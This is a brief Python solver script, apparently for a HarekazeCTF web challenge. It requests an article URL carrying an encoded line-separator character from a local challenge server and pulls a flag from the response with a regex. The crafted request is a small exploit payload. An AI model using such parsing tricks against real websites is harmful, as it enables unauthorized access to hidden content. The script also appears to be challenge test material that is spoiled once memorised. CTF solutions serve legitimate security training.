import os
import re
import requests

host = os.getenv('HOST', '0.0.0.0')
port = os.getenv('PORT', '8001')
url = 'http://{}:{}/article/%E2%80%A8-8663'.format(host, port)

r = requests.get(url)
flag = re.findall(r'(HarekazeCTF\{.+?\})', r.text)[0]
print(flag)